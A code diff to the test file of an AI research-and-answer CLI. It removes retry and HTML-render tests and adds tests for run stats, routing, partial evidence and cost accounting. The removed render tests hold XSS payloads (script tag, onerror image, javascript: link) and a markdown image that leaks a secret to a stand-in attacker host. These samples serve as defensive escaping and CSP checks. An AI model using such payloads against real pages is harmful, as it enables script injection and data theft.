@@ -14,7 +14,6 @@ from mrai.agent import Answer
 from mrai.cli import app
 from pydantic_ai import AgentRunError, UnexpectedModelBehavior
 from pydantic_ai.exceptions import UsageLimitExceeded
-from pydantic_ai.usage import UsageLimits
 from typer.testing import CliRunner
 
 
@@ -36,13 +35,13 @@ def _upstream_error(status: int = 504) -> AgentRunError:
 
 
 def _research():
-    return SimpleNamespace(all_messages=lambda: [])
+    return SimpleNamespace(all_messages=lambda: [], new_messages=lambda: [])
 
 
 def _answer(n: int):
     """A writer result whose Answer is topic tN / title TN / markdown mN."""
     ans = Answer(topic=f"t{n}", title=f"T{n}", markdown=f"m{n}")
-    return SimpleNamespace(output=ans, all_messages=lambda: [])
+    return SimpleNamespace(output=ans, all_messages=lambda: [], new_messages=lambda: [])
 
 
 class _ScriptedPipeline:
@@ -68,7 +67,9 @@ def pipeline(cli_hermetic, monkeypatch):
     """Skip model setup and replace the real pipeline with scripted outcomes."""
     script = _ScriptedPipeline()
     monkeypatch.setattr(cli, "build_researcher", lambda *a, **k: (object(), None))
-    monkeypatch.setattr(cli, "build_writers", lambda *a, **k: [object()] * 3)
+    monkeypatch.setattr(
+        cli, "build_writers", lambda root, model, angles, **k: [object()] * len(angles)
+    )
     monkeypatch.setattr(cli, "_run_pipeline", script.run)
     return script
 
@@ -142,22 +143,6 @@ def test_all_candidates_failing_exits(pipeline):
     assert "all candidates failed" in result.output
 
 
-def test_upstream_error_is_retried_once(pipeline):
-    pipeline(_upstream_error(504), [_answer(1)])
-    result = _ai("--no-write", "hello")
-    assert result.exit_code == 0
-    assert "retrying run once" in result.output
-    assert "m1" in result.output
-
-
-def test_upstream_error_twice_exits_and_logs(pipeline, cli_hermetic):
-    pipeline(_upstream_error(504), _upstream_error(529))
-    result = _ai("hello")
-    assert result.exit_code == 1
-    assert "retry failed" in result.output
-    assert "retry failed" in (cli_hermetic / ".mrai" / "hello.md").read_text()
-
-
 def test_routing_decision_is_logged(pipeline, cli_hermetic, monkeypatch):
     import json
 
@@ -184,14 +169,6 @@ def test_non_retryable_error_exits_without_retry(pipeline):
     assert "run failed" in result.output and "retrying" not in result.output
 
 
-def test_tool_timeout_is_retried_then_exits(pipeline):
-    pipeline(cli.ToolCallTimeout("delegate_task"), cli.ToolCallTimeout("delegate_task"))
-    result = _ai("hello")
-    assert result.exit_code == 1
-    assert "retrying run once" in result.output
-    assert "tool call exceeded" in result.output
-
-
 @pytest.mark.parametrize(
     "status,expected", [(504, True), (529, True), (429, True), (400, False), (500, False)]
 )
@@ -203,29 +180,6 @@ def test_is_retryable_sees_chained_cause():
     exc = AgentRunError("model request failed")
     exc.__cause__ = _upstream_error(504)
     assert cli._is_retryable(exc) is True
-
-
-def test_usage_limit_is_retried_with_double_limit(monkeypatch):
-    limits_seen = []
-
-    async def _fake(agent, query, history, deps, view, usage, *, limits, **_):
-        limits_seen.append(limits.request_limit)
-        if len(limits_seen) == 1:
-            raise UsageLimitExceeded("request limit exceeded")
-        return "done"
-
-    monkeypatch.setattr(cli, "_run_with_watchdog", _fake)
-    run = cli._run_limited(
-        object(),
-        "q",
-        None,
-        cli.MemoryDeps(),
-        30.0,
-        cli.RunUsage(),
-        limits=UsageLimits(request_limit=100),
-    )
-    assert asyncio.run(run) == "done"
-    assert limits_seen == [100, 200]
 
 
 def test_log_failure_writes_stub_but_not_durable_memory(cli_hermetic):
@@ -262,24 +216,6 @@ def test_workspace_error_without_history_propagates(pipeline):
     assert isinstance(result.exception, cli.UserError)
 
 
-def test_write_render_writes_html_under_state_dir(tmp_path, monkeypatch):
-    monkeypatch.chdir(tmp_path)
-    path = cli._write_render(tmp_path / "state", "hello world", "# Hi\n\nSee `x`.")
-    assert path == tmp_path / "state" / "renders" / "hello-world.html"
-    assert "<h1>Hi</h1>" in path.read_text()
-    assert not (tmp_path / ".mrai").exists()
-
-
-def test_host_path_maps_container_state_dir_to_host(tmp_path, monkeypatch):
-    state = tmp_path / "state"
-    inside = state / "renders" / "x.html"
-    assert cli._host_path(inside, state) == inside
-    monkeypatch.setenv("MRAI_HOST_DIR", "/home/u/.mrai/workspaces/repo-1234abcd")
-    assert cli._host_path(inside, state) == cli.Path(
-        "/home/u/.mrai/workspaces/repo-1234abcd/renders/x.html"
-    )
-
-
 def test_resolve_mrai_dir_precedence(tmp_path, monkeypatch):
     repo = tmp_path / "repo"
     default = cli.resolve_mrai_dir(None, repo)
@@ -297,20 +233,175 @@ def test_default_state_dir_differs_per_workspace(tmp_path):
     assert a == cli.resolve_mrai_dir(None, tmp_path / "x" / "api")
 
 
-def test_render_escapes_html_from_the_answer(tmp_path):
-    hostile = "<script>alert(1)</script> <img src=x onerror=alert(1)> [x](javascript:alert(1))"
-    html = cli._write_render(tmp_path, "t", hostile).read_text()
-    body = html.split("<body>", 1)[1]
-    assert "<script>alert" not in body and "&lt;script&gt;" in body
-    assert "<img" not in body
-    assert 'href="javascript:' not in body
+def test_stats_markdown_is_a_labelled_table():
+    stats = cli.RunStats(
+        cost=None,
+        jev=0.000074,
+        requests=9,
+        tools=cli.Counter({"read_file": 6, "git_diff": 2}),
+        web=["https://x.example/a|b"],
+    )
+    md = cli._stats_markdown(stats)
+    assert md.startswith(cli.STATS_MARKER)
+    assert "| Run stats | |" in md
+    assert "| Cost | unavailable |" in md
+    assert "| Jev | $0.000074 |" in md
+    assert "| Requests | 9 |" in md
+    assert "| Tool calls (8) | `read_file` 6 · `git_diff` 2 |" in md
+    assert "| Web fetches | https://x.example/a\\|b |" in md
 
 
-def test_render_csp_allows_only_its_own_script(tmp_path):
-    html = cli._write_render(tmp_path, "t", "![](https://evil.example/?d=secret)").read_text()
-    csp = html.split('http-equiv="Content-Security-Policy" content="', 1)[1].split('"', 1)[0]
-    script = html.rsplit("<script>", 1)[1].split("</script>", 1)[0]
-    digest = cli.base64.b64encode(cli.hashlib.sha256(script.encode()).digest()).decode()
-    assert f"'sha256-{digest}'" in csp
-    assert "img-src data:" in csp
-    assert html.count('integrity="sha512-') == 2
+def test_upstream_error_fails_without_rerunning_the_pipeline(pipeline, cli_hermetic):
+    pipeline(_upstream_error(504), [_answer(1)])
+    result = _ai("hello")
+    assert result.exit_code == 1
+    assert "run failed after retrying the request" in result.output
+    assert len(pipeline.histories) == 1  # the transport retried; the run did not
+    assert "run failed" in (cli_hermetic / ".mrai" / "hello.md").read_text()
+
+
+def test_hung_tool_fails_without_rerunning(pipeline):
+    pipeline(cli.ToolCallTimeout("delegate_task"), [_answer(1)])
+    result = _ai("--no-write", "hello")
+    assert result.exit_code == 1 and "hung past its time budget" in result.output
+    assert len(pipeline.histories) == 1
+
+
+def _route(tier: str, source: str) -> cli.Route:
+    return cli.Route("m", 1.0, source, tier=tier)
+
+
+@pytest.mark.parametrize(
+    "tier,source,n",
+    [
+        ("pro", "jev", 3),
+        ("pro", "flag", 3),
+        ("pro", "fallback", 1),
+        ("flash", "jev", 1),
+        ("", "flag", 1),
+    ],
+)
+def test_only_a_judged_complex_question_fans_out(tier, source, n):
+    assert len(cli._angles(_route(tier, source))) == n
+
+
+def test_trivial_question_is_answered_but_not_logged(pipeline, cli_hermetic):
+    pipeline([_answer(1)])
+    result = _ai("hi")
+    assert result.exit_code == 0 and "m1" in result.output
+    assert "not logged" in result.output
+    assert not list((cli_hermetic / ".mrai").glob("t1.md"))
+
+
+def test_is_trivial_needs_both_short_and_tool_free():
+    assert cli._is_trivial("hi there", cli.RunStats(cost=None))
+    assert not cli._is_trivial("hi", cli.RunStats(cost=None, tools=cli.Counter({"read_file": 1})))
+    assert not cli._is_trivial("where is slugify defined", cli.RunStats(cost=None))
+
+
+def test_history_saves_the_answer_not_the_brief(tmp_path):
+    path = tmp_path / "session.json"
+    cli._append_turn(path, [], "q1", "answer one", 20)
+    cli._append_turn(path, cli._load_history(path, 20), "q2", "answer two", 20)
+    texts = [getattr(p, "content", None) for m in cli._load_history(path, 20) for p in m.parts]
+    assert texts == ["q1", "answer one", "q2", "answer two"]
+
+
+def test_writers_get_only_the_brief(monkeypatch):
+    calls = []
+
+    async def fake(agent, prompt, history, deps, view, usage, **kw):
+        calls.append((agent, prompt, history))
+        if agent == "researcher":
+            return SimpleNamespace(output="Question: q\nslugify at logbook.py:10")
+        return _answer(1)
+
+    monkeypatch.setattr(cli, "_run_with_watchdog", fake)
+    settings = cli.Settings(openrouter_api_key=None)
+    writers = [("w1", "angle one"), ("w2", "angle two")]
+    _, results, _ = asyncio.run(
+        cli._run_pipeline("researcher", writers, "q", ["old turn"], cli.MemoryDeps(), settings)
+    )
+    assert calls[0] == ("researcher", "q", ["old turn"])
+    for _agent, prompt, history in calls[1:]:
+        assert history is None
+        assert "slugify at logbook.py:10" in prompt
+    assert {c[0] for c in calls[1:]} == {"w1", "w2"} and len(results) == 2
+
+
+def test_request_limit_writes_from_partial_evidence(monkeypatch):
+    prompts = []
+
+    async def fake(agent, prompt, history, deps, view, usage, **kw):
+        if agent == "researcher":
+            raise UsageLimitExceeded("request limit")
+        prompts.append(prompt)
+        return _answer(1)
+
+    monkeypatch.setattr(cli, "_run_with_watchdog", fake)
+    research, results, _ = asyncio.run(
+        cli._run_pipeline(
+            "researcher",
+            [("w", "a")],
+            "q",
+            None,
+            cli.MemoryDeps(),
+            cli.Settings(openrouter_api_key=None),
+        )
+    )
+    assert isinstance(research, cli._PartialResearch)
+    assert "evidence is partial" in prompts[0] and len(results) == 1
+
+
+def test_partial_evidence_keeps_calls_results_and_notes():
+    from pydantic_ai.messages import (
+        ModelRequest,
+        ModelResponse,
+        TextPart,
+        ToolCallPart,
+        ToolReturnPart,
+    )
+
+    msgs = [
+        ModelResponse(
+            parts=[TextPart(content="looking"), ToolCallPart("read_file", {"path": "a.py"})]
+        ),
+        ModelRequest(parts=[ToolReturnPart("read_file", "x" * 5000)]),
+    ]
+    text = cli._partial_evidence(msgs, per_part=100)
+    assert "looking" in text and '→ read_file({"path": "a.py"})' in text
+    assert "x" * 100 + " …" in text and "x" * 101 not in text
+
+
+def test_reported_cost_sums_this_runs_responses_only():
+    from pydantic_ai.messages import ModelRequest, ModelResponse, TextPart, UserPromptPart
+
+    def resp(cost):
+        return ModelResponse(parts=[TextPart("x")], provider_details={"cost": cost})
+
+    research = SimpleNamespace(
+        new_messages=lambda: [ModelRequest(parts=[UserPromptPart("q")]), resp(0.002)]
+    )
+    writer = SimpleNamespace(new_messages=lambda: [resp(0.0005)])
+    assert cli._reported_cost([research, writer]) == cli.Decimal("0.0025")
+    assert cli._reported_cost([SimpleNamespace(new_messages=lambda: [])]) is None
+
+
+def test_partial_research_excludes_replayed_history():
+    from pydantic_ai.messages import ModelRequest, UserPromptPart
+
+    h1, h2, new = (ModelRequest(parts=[UserPromptPart(t)]) for t in ("h1", "h2", "new"))
+    r = cli._PartialResearch([h1, h2, new], replayed=2)
+    assert r.new_messages() == [new] and r.all_messages() == [h1, h2, new]
+
+
+def test_cost_note_is_shown():
+    stats = cli.RunStats(cost=0.01, cost_note="excl. explorer subagent")
+    assert "| Cost | $0.010000 (excl. explorer subagent) |" in cli._stats_markdown(stats)
+
+
+def test_openrouter_models_request_usage_accounting():
+    from mrai import agent as agent_mod
+
+    model = agent_mod._model(cli.Settings(openrouter_api_key="k"), "k", "a/b")
+    assert model.settings == {"openrouter_usage": {"include": True}}
